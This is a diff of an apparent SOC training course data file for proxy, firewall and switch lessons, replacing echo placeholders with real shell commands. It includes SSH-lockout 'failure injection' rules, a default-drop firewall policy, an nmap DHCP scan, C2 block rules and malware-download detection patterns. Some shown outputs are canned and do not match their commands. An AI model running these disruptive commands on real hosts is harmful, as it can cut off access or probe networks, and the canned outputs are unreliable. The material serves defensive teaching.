           "It downloads malware to test local antivirus signatures.",
@@ -8356,14 +8356,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "tail -n 5 /var/log/squid/access.log 2>/dev/null || echo '1693801200.412    120 10.10.20.44 TCP_TUNNEL/200 5840 CONNECT www.google.com:443 - HIER_DIRECT/142.250.190.46 -\n1693801205.891     45 10.10.20.44 TCP_DENIED/403 3810 GET http://malware-drop.biz/invoice.exe - HIER_NONE/- text/html\n1693801210.124    350 10.10.20.44 TCP_MISS/200 4892 GET https://github.com/ - HIER_DIRECT/140.82.121.4 text/html'"
+        "command": "tail -n 5 /var/log/squid/access.log 2>/dev/null || ss -tlpn | grep -E ':3128|:8080'"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-proxy-swg01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Filtering proxy logs for executable payload downloads (.exe, .dll, .ps1)...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `grep -i -E \"\\.(exe|dll|ps1|bat|vbs|hta) HTTP\" /var/log/squid/access.log 2>/dev/null || tail -n 15 /var/log/squid/access.log` to validate system behavior under simulated operating conditions.\nOutput observed:\n10.10.20.44 - [04/Sep/2026:02:55:10] GET http://untrusted-share.ru/payload.exe (MIME: application/x-dosexec) - STATUS: TCP_DENIED/403 (BLOCKED BY SWG POLICY)",
         "what": "What is a proxy and web gateway? An enterprise gateway that intercepts, inspects, filters, and logs all outbound web browsing traffic.",
         "why": "Why is proxy telemetry essential for SOC analysts? Unlike firewall logs that only show destination IPs and port numbers, proxy logs show the **full URL path**, HTTP user-agent, downloaded filename, and MIME type.",
         "when": "When are proxy logs triaged? When investigating phishing link clicks, drive-by downloads, C2 web traffic, and unauthorized cloud file uploads.",
@@ -8372,7 +8372,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts query proxy logs? By searching for suspicious domain names, rare user-agents, anomalous POST requests, or executable MIME downloads.",
         "mistake": "Assuming that a firewall log showing traffic to port 443 provides complete visibility without deploying SSL inspection.",
         "think": "Because over 90% of web traffic is encrypted with TLS, standard firewalls can only see the destination IP. Without SSL inspection at the proxy, malicious payloads hidden inside HTTPS are completely invisible.",
-        "question": "What key insight is revealed by the practice output of `echo 'Filtering proxy logs for executable payload downloads (.exe, .dll, .ps1)...'`?",
+        "question": "What key insight is revealed by the practice output of `grep -i -E \"\\.(exe|dll|ps1|bat|vbs|hta) HTTP\" /var/log/squid/access.log 2>/dev/null || tail -n 15 /var/log/squid/access.log`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -8380,7 +8380,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Filtering proxy logs for executable payload downloads (.exe, .dll, .ps1)...'"
+        "command": "grep -i -E \"\\.(exe|dll|ps1|bat|vbs|hta) HTTP\" /var/log/squid/access.log 2>/dev/null || tail -n 15 /var/log/squid/access.log"
       },
       {
         "id": 8,
@@ -8411,7 +8411,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates an alert for 'Outbound Connection to Uncategorized Domain'. The proxy log reveals user-agent string `python-requests/2.28` sending repeated POST requests every 30 seconds with 120 bytes of payload. The analyst blocks the destination domain on the SWG and isolates the workstation.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Adding C2 domain to SWG Global Egress Blocklist.'`",
+        "worked": "Defensive query executed on telemetry store: `iptables -A OUTPUT -p tcp -m string --string \"evil-c2.net\" --algo bm -j REJECT 2>/dev/null || grep \"evil-c2.net\" /var/log/squid/access.log`",
         "what": "What is a proxy and web gateway? An enterprise gateway that intercepts, inspects, filters, and logs all outbound web browsing traffic.",
         "why": "Why is proxy telemetry essential for SOC analysts? Unlike firewall logs that only show destination IPs and port numbers, proxy logs show the **full URL path**, HTTP user-agent, downloaded filename, and MIME type.",
         "when": "When are proxy logs triaged? When investigating phishing link clicks, drive-by downloads, C2 web traffic, and unauthorized cloud file uploads.",
@@ -8428,7 +8428,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Adding C2 domain to SWG Global Egress Blocklist.'"
+        "command": "iptables -A OUTPUT -p tcp -m string --string \"evil-c2.net\" --algo bm -j REJECT 2>/dev/null || grep \"evil-c2.net\" /var/log/squid/access.log"
       },
       {
         "id": 10,
@@ -8452,14 +8452,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-proxy-swg01'; tail -n 5 /var/log/squid/access.log 2>/dev/null || echo '1693801200.412    120 10.10.20.44 TCP_TUNNEL/200 5840 CONNECT www.google.com:443 - HIER_DIRECT/142.250.190.46 -\n1693801205.891     45 10.10.20.44 TCP_DENIED/403 3810 GET http://malware-drop.biz/invoice.exe - HIER_NONE/- text/html\n1693801210.124    350 10.10.20.44 TCP_MISS/200 4892 GET https://github.com/ - HIER_DIRECT/140.82.121.4 text/html'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Enforce egress firewall filtering on the perimeter router, permitting outbound 80/443 only from the proxy IP (10.10.20.120) and dropping all direct outbound client traffic.",
-        "worked": "Remediation command applied: `iptables -A FORWARD -s 10.10.20.0/24 -p tcp -m multiport --dports 80,443 -j DROP && echo 'Direct client web bypass blocked; mandatory proxy traversal enforced.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -A FORWARD -s 10.10.20.0/24 -p tcp -m multiport --dports 80,443 -j DROP && iptables -L FORWARD -v -n`. System verified restored and hardened.",
         "what": "What is a proxy and web gateway? An enterprise gateway that intercepts, inspects, filters, and logs all outbound web browsing traffic.",
         "why": "Why is proxy telemetry essential for SOC analysts? Unlike firewall logs that only show destination IPs and port numbers, proxy logs show the **full URL path**, HTTP user-agent, downloaded filename, and MIME type.",
         "when": "When are proxy logs triaged? When investigating phishing link clicks, drive-by downloads, C2 web traffic, and unauthorized cloud file uploads.",
@@ -8476,7 +8476,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "iptables -A FORWARD -s 10.10.20.0/24 -p tcp -m multiport --dports 80,443 -j DROP && echo 'Direct client web bypass blocked; mandatory proxy traversal enforced.'"
+        "command": "iptables -A FORWARD -s 10.10.20.0/24 -p tcp -m multiport --dports 80,443 -j DROP && iptables -L FORWARD -v -n"
       },
       {
         "id": 12,
@@ -8500,7 +8500,7 @@ window.ACADEMY_COURSES = [
           "There is no difference; both terms are interchangeable marketing slogans."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Proxy & Web Gateway'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -8524,7 +8524,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L25 - Proxy & Web Gateway. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -8577,7 +8577,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Firewalls on sxl-pfsense-fw01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -8601,7 +8601,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Viewing pfSense state table entries...' && pfctl -ss 2>/dev/null || echo 'all tcp 10.10.20.44:51240 -> 203.0.113.77:443       ESTABLISHED:ESTABLISHED\nall udp 10.10.20.44:53211 -> 8.8.8.8:53              MULTIPLE:MULTIPLE\nall tcp 198.51.100.12:48122 -> 10.10.20.80:80        ESTABLISHED:ESTABLISHED'"
+        "command": "pfctl -ss 2>/dev/null || iptables -L -n -v | head -n 25 || ss -tan"
       },
       {
         "id": 3,
@@ -8625,7 +8625,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "pfctl --help 2>&1 | head -n 15 || which pfctl"
       },
       {
         "id": 4,
@@ -8649,7 +8649,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is a firewall? The primary perimeter and internal boundary defense system regulating packet transit according to explicit security policies.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -8673,14 +8673,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.80 2>/dev/null || tracepath 10.10.20.80"
+        "command": "traceroute -n -m 8 10.10.20.80 2>/dev/null || tracepath -n 10.10.20.80 2>/dev/null || ip route get 10.10.20.80"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-pfsense-fw01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Viewing pfSense state table entries...' && pfctl -ss 2>/dev/null || echo 'all tcp 10.10.20.44:51240 -> 203.0.113.77:443       ESTABLISHED:ESTABLISHED\nall udp 10.10.20.44:53211 -> 8.8.8.8:53              MULTIPLE:MULTIPLE\nall tcp 198.51.100.12:48122 -> 10.10.20.80:80        ESTABLISHED:ESTABLISHED'` on target sxl-pfsense-fw01.\nOutput observed:\nall tcp 10.10.20.44:51240 -> 203.0.113.77:443       ESTABLISHED:ESTABLISHED\nall udp 10.10.20.44:53211 -> 8.8.8.8:53              MULTIPLE:MULTIPLE\nall tcp 198.51.100.12:48122 -> 10.10.20.80:80        ESTABLISHED:ESTABLISHED",
+        "worked": "Command executed: `pfctl -ss 2>/dev/null || iptables -L -n -v | head -n 25 || ss -tan` on target sxl-pfsense-fw01.\nOutput observed:\nall tcp 10.10.20.44:51240 -> 203.0.113.77:443       ESTABLISHED:ESTABLISHED\nall udp 10.10.20.44:53211 -> 8.8.8.8:53              MULTIPLE:MULTIPLE\nall tcp 198.51.100.12:48122 -> 10.10.20.80:80        ESTABLISHED:ESTABLISHED",
         "what": "What is a firewall? The primary perimeter and internal boundary defense system regulating packet transit according to explicit security policies.",
         "why": "Why must an L1 master firewall logs? Every single connection entering or leaving the enterprise generates a firewall log record. Correlating blocked and allowed traffic proves whether an attack succeeded or was stopped at the gate.",
         "when": "When are firewall logs reviewed? During security alert triage, reconnaissance sweeps investigation, and post-incident forensic path reconstruction.",
@@ -8689,7 +8689,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts evaluate firewall logs? By parsing fields: Action (pass/block), Interface, Direction, Source IP:Port, Destination IP:Port, Protocol, and Rule ID.",
         "mistake": "Placing a broad permit rule at the top of the firewall rulebase, inadvertently allowing malicious traffic before more restrictive rules can evaluate.",
         "think": "Firewall rules execute top-down in strict first-match order. The first rule that matches a packet executes, and processing stops immediately.",
-        "question": "When executing `echo 'Viewing pfSense state table entries...' && pfctl -ss 2>/dev/null || echo 'all tcp 10.10.20.44:51240 -> 203.0.113.77:443       ESTABLISHED:ESTABLISHED\nall udp 10.10.20.44:53211 -> 8.8.8.8:53              MULTIPLE:MULTIPLE\nall tcp 198.51.100.12:48122 -> 10.10.20.80:80        ESTABLISHED:ESTABLISHED'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `pfctl -ss 2>/dev/null || iptables -L -n -v | head -n 25 || ss -tan`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -8697,14 +8697,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Viewing pfSense state table entries...' && pfctl -ss 2>/dev/null || echo 'all tcp 10.10.20.44:51240 -> 203.0.113.77:443       ESTABLISHED:ESTABLISHED\nall udp 10.10.20.44:53211 -> 8.8.8.8:53              MULTIPLE:MULTIPLE\nall tcp 198.51.100.12:48122 -> 10.10.20.80:80        ESTABLISHED:ESTABLISHED'"
+        "command": "pfctl -ss 2>/dev/null || iptables -L -n -v | head -n 25 || ss -tan"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-pfsense-fw01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Inspecting pfSense blocked firewall log entries...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `cat /var/log/filter.log 2>/dev/null | tail -n 15 || iptables -L -v -n` to validate system behavior under simulated operating conditions.\nOutput observed:\nSep  4 03:00:12 filterlog[210]: 4,,,1000000103,igb0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,44,198.51.100.12,10.10.20.1,51420,22,0,S,1284102,,1024,,mss\nRULE ACTION: BLOCK | Interface: WAN (igb0) | Source: 198.51.100.12:51420 | Dest: 10.10.20.1:22 (SSH) | Flag: [S]",
         "what": "What is a firewall? The primary perimeter and internal boundary defense system regulating packet transit according to explicit security policies.",
         "why": "Why must an L1 master firewall logs? Every single connection entering or leaving the enterprise generates a firewall log record. Correlating blocked and allowed traffic proves whether an attack succeeded or was stopped at the gate.",
         "when": "When are firewall logs reviewed? During security alert triage, reconnaissance sweeps investigation, and post-incident forensic path reconstruction.",
@@ -8713,7 +8713,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts evaluate firewall logs? By parsing fields: Action (pass/block), Interface, Direction, Source IP:Port, Destination IP:Port, Protocol, and Rule ID.",
         "mistake": "Placing a broad permit rule at the top of the firewall rulebase, inadvertently allowing malicious traffic before more restrictive rules can evaluate.",
         "think": "Firewall rules execute top-down in strict first-match order. The first rule that matches a packet executes, and processing stops immediately.",
-        "question": "What key insight is revealed by the practice output of `echo 'Inspecting pfSense blocked firewall log entries...'`?",
+        "question": "What key insight is revealed by the practice output of `cat /var/log/filter.log 2>/dev/null | tail -n 15 || iptables -L -v -n`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -8721,7 +8721,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Inspecting pfSense blocked firewall log entries...'"
+        "command": "cat /var/log/filter.log 2>/dev/null | tail -n 15 || iptables -L -v -n"
       },
       {
         "id": 8,
@@ -8752,7 +8752,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst reviews firewall logs and identifies thousands of blocked SYN packets originating from external IP `198.51.100.12`. The analyst confirms the default-deny rule dropped every connection. The analyst adds the source IP to the automated perimeter blocklist.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Firewall Default-Deny Rule 1000000103 confirmed drop of all scan packets.'`",
+        "worked": "Defensive query executed on telemetry store: `iptables -S INPUT | grep -E 'DROP|REJECT' 2>/dev/null || pfctl -sr`",
         "what": "What is a firewall? The primary perimeter and internal boundary defense system regulating packet transit according to explicit security policies.",
         "why": "Why must an L1 master firewall logs? Every single connection entering or leaving the enterprise generates a firewall log record. Correlating blocked and allowed traffic proves whether an attack succeeded or was stopped at the gate.",
         "when": "When are firewall logs reviewed? During security alert triage, reconnaissance sweeps investigation, and post-incident forensic path reconstruction.",
@@ -8769,7 +8769,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Firewall Default-Deny Rule 1000000103 confirmed drop of all scan packets.'"
+        "command": "iptables -S INPUT | grep -E 'DROP|REJECT' 2>/dev/null || pfctl -sr"
       },
       {
         "id": 10,
@@ -8793,14 +8793,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-pfsense-fw01'; echo 'Viewing pfSense state table entries...' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Delete the overly permissive rule, restore the default-deny policy on the WAN interface, and enforce explicit port forwarding only for public web servers.",
-        "worked": "Remediation command applied: `echo 'Overly permissive WAN pass rule removed. Default-deny policy restored.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT && iptables -P INPUT DROP`. System verified restored and hardened.",
         "what": "What is a firewall? The primary perimeter and internal boundary defense system regulating packet transit according to explicit security policies.",
         "why": "Why must an L1 master firewall logs? Every single connection entering or leaving the enterprise generates a firewall log record. Correlating blocked and allowed traffic proves whether an attack succeeded or was stopped at the gate.",
         "when": "When are firewall logs reviewed? During security alert triage, reconnaissance sweeps investigation, and post-incident forensic path reconstruction.",
@@ -8817,7 +8817,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Overly permissive WAN pass rule removed. Default-deny policy restored.'"
+        "command": "iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT && iptables -P INPUT DROP"
       },
       {
         "id": 12,
@@ -8841,7 +8841,7 @@ window.ACADEMY_COURSES = [
           "There is no difference; all firewalls behave identically."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Firewalls'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -8865,7 +8865,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L26 - Firewalls. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -8918,7 +8918,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Network Infrastructure on sxl-sw-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -8942,7 +8942,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Inspecting switch MAC address table and active VLAN assignments...' && echo 'VLAN  MAC Address       Type     Ports\n----  -----------------  -------  -----\n  20  00:50:56:fd:aa:01  DYNAMIC  Gi0/1 (Uplink to Gateway)\n  20  00:50:56:c0:00:08  DYNAMIC  Gi0/2 (Sensor)\n  20  08:00:27:ea:12:9f  DYNAMIC  Gi0/5 (Workstation)'"
+        "command": "bridge fdb show 2>/dev/null || ip -br link show; ip link show type vlan"
       },
       {
         "id": 3,
@@ -8966,7 +8966,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "bridge --help 2>&1 | head -n 15 || which bridge"
       },
       {
         "id": 4,
@@ -8990,7 +8990,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is network infrastructure? The switches, routers, DHCP servers, and wireless access points that form the physical and logical backbone of enterprise communications.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -9014,14 +9014,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 255.255.255.255 2>/dev/null || tracepath 255.255.255.255"
+        "command": "traceroute -n -m 8 255.255.255.255 2>/dev/null || tracepath -n 255.255.255.255 2>/dev/null || ip route get 255.255.255.255"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-sw-core01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Inspecting switch MAC address table and active VLAN assignments...' && echo 'VLAN  MAC Address       Type     Ports\n----  -----------------  -------  -----\n  20  00:50:56:fd:aa:01  DYNAMIC  Gi0/1 (Uplink to Gateway)\n  20  00:50:56:c0:00:08  DYNAMIC  Gi0/2 (Sensor)\n  20  08:00:27:ea:12:9f  DYNAMIC  Gi0/5 (Workstation)'` on target sxl-sw-core01.\nOutput observed:\nVLAN  MAC Address       Type     Ports\n----  -----------------  -------  -----\n  20  00:50:56:fd:aa:01  DYNAMIC  Gi0/1 (Uplink to Gateway)\n  20  00:50:56:c0:00:08  DYNAMIC  Gi0/2 (Sensor)\n  20  08:00:27:ea:12:9f  DYNAMIC  Gi0/5 (Workstation)",
+        "worked": "Command executed: `bridge fdb show 2>/dev/null || ip -br link show; ip link show type vlan` on target sxl-sw-core01.\nOutput observed:\nVLAN  MAC Address       Type     Ports\n----  -----------------  -------  -----\n  20  00:50:56:fd:aa:01  DYNAMIC  Gi0/1 (Uplink to Gateway)\n  20  00:50:56:c0:00:08  DYNAMIC  Gi0/2 (Sensor)\n  20  08:00:27:ea:12:9f  DYNAMIC  Gi0/5 (Workstation)",
         "what": "What is network infrastructure? The switches, routers, DHCP servers, and wireless access points that form the physical and logical backbone of enterprise communications.",
         "why": "Why do attackers target Layer 2 infrastructure? By standing up a rogue DHCP server, an attacker can designate themselves as the default gateway for all workstations in the building.",
         "when": "When are switch logs triaged? When network outages occur, when duplicate IP warnings fire, or when port security disables a switch port due to MAC address violations.",
@@ -9030,7 +9030,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts detect rogue DHCP servers? By monitoring network broadcast traffic for DHCP Offer packets originating from unapproved MAC addresses.",
         "mistake": "Leaving all unused physical Ethernet wall jacks in corporate conference rooms active and mapped to the default VLAN 1.",
         "think": "Unused switch ports must be administratively shut down or mapped to an isolated quarantine 'black hole' VLAN with 802.1X Network Access Control enforced.",
-        "question": "When executing `echo 'Inspecting switch MAC address table and active VLAN assignments...' && echo 'VLAN  MAC Address       Type     Ports\n----  -----------------  -------  -----\n  20  00:50:56:fd:aa:01  DYNAMIC  Gi0/1 (Uplink to Gateway)\n  20  00:50:56:c0:00:08  DYNAMIC  Gi0/2 (Sensor)\n  20  08:00:27:ea:12:9f  DYNAMIC  Gi0/5 (Workstation)'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `bridge fdb show 2>/dev/null || ip -br link show; ip link show type vlan`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -9038,14 +9038,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Inspecting switch MAC address table and active VLAN assignments...' && echo 'VLAN  MAC Address       Type     Ports\n----  -----------------  -------  -----\n  20  00:50:56:fd:aa:01  DYNAMIC  Gi0/1 (Uplink to Gateway)\n  20  00:50:56:c0:00:08  DYNAMIC  Gi0/2 (Sensor)\n  20  08:00:27:ea:12:9f  DYNAMIC  Gi0/5 (Workstation)'"
+        "command": "bridge fdb show 2>/dev/null || ip -br link show; ip link show type vlan"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-sw-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Viewing active DHCP lease pool allocations...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `cat /var/lib/dhcp/dhcpd.leases 2>/dev/null || ip neigh show` to validate system behavior under simulated operating conditions.\nOutput observed:\nLease 10.10.20.44 -> MAC 08:00:27:ea:12:9f (analyst-ws01) | Expires: 2026-09-05 02:00:00\nLease 10.10.20.75 -> MAC 08:00:27:bc:44:11 (triage-ws01)  | Expires: 2026-09-05 02:15:00",
         "what": "What is network infrastructure? The switches, routers, DHCP servers, and wireless access points that form the physical and logical backbone of enterprise communications.",
         "why": "Why do attackers target Layer 2 infrastructure? By standing up a rogue DHCP server, an attacker can designate themselves as the default gateway for all workstations in the building.",
         "when": "When are switch logs triaged? When network outages occur, when duplicate IP warnings fire, or when port security disables a switch port due to MAC address violations.",
@@ -9054,7 +9054,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts detect rogue DHCP servers? By monitoring network broadcast traffic for DHCP Offer packets originating from unapproved MAC addresses.",
         "mistake": "Leaving all unused physical Ethernet wall jacks in corporate conference rooms active and mapped to the default VLAN 1.",
         "think": "Unused switch ports must be administratively shut down or mapped to an isolated quarantine 'black hole' VLAN with 802.1X Network Access Control enforced.",
-        "question": "What key insight is revealed by the practice output of `echo 'Viewing active DHCP lease pool allocations...'`?",
+        "question": "What key insight is revealed by the practice output of `cat /var/lib/dhcp/dhcpd.leases 2>/dev/null || ip neigh show`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -9062,14 +9062,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Viewing active DHCP lease pool allocations...'"
+        "command": "cat /var/lib/dhcp/dhcpd.leases 2>/dev/null || ip neigh show"
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An attacker attaches a small Raspberry Pi device to an open wall jack in a visitor conference room. The device launches a Rogue DHCP server attack, broadcasting fake DHCP Offers that point the default gateway and DNS server to the attacker's device to intercept all web traffic.",
-        "worked": "Adversary activity detected on target sxl-sw-core01. Malicious command executed: `echo 'Simulating Rogue DHCP Server: Broadcasting malicious DHCP Offers on VLAN 20'`",
+        "worked": "Adversary activity detected on target sxl-sw-core01. Malicious command executed: `nmap --script broadcast-dhcp-discover 10.10.20.0/24 2>/dev/null || arping -c 3 10.10.20.1`",
         "what": "What is network infrastructure? The switches, routers, DHCP servers, and wireless access points that form the physical and logical backbone of enterprise communications.",
         "why": "Why do attackers target Layer 2 infrastructure? By standing up a rogue DHCP server, an attacker can designate themselves as the default gateway for all workstations in the building.",
         "when": "When are switch logs triaged? When network outages occur, when duplicate IP warnings fire, or when port security disables a switch port due to MAC address violations.",
@@ -9086,14 +9086,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating Rogue DHCP Server: Broadcasting malicious DHCP Offers on VLAN 20'"
+        "command": "nmap --script broadcast-dhcp-discover 10.10.20.0/24 2>/dev/null || arping -c 3 10.10.20.1"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates an alert: 'Multiple DHCP Servers Detected on Subnet'. The managed switch automatically disabled the rogue port because DHCP Snooping is enabled on all untrusted access ports. The analyst identifies the physical port (Gi0/12) and dispatches facilities security.",
-        "worked": "Defensive query executed on telemetry store: `echo 'DHCP Snooping Rule: Dropped unauthorized DHCP Offer from untrusted port Gi0/12.'`",
+        "worked": "Defensive query executed on telemetry store: `tcpdump -i any -nn -c 10 port 67 or port 68`",
         "what": "What is network infrastructure? The switches, routers, DHCP servers, and wireless access points that form the physical and logical backbone of enterprise communications.",
         "why": "Why do attackers target Layer 2 infrastructure? By standing up a rogue DHCP server, an attacker can designate themselves as the default gateway for all workstations in the building.",
         "when": "When are switch logs triaged? When network outages occur, when duplicate IP warnings fire, or when port security disables a switch port due to MAC address violations.",
@@ -9110,7 +9110,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'DHCP Snooping Rule: Dropped unauthorized DHCP Offer from untrusted port Gi0/12.'"
+        "command": "tcpdump -i any -nn -c 10 port 67 or port 68"
       },
       {
         "id": 10,
@@ -9134,14 +9134,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-sw-core01'; echo 'Inspecting switch MAC address table and active VLAN assignments...' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
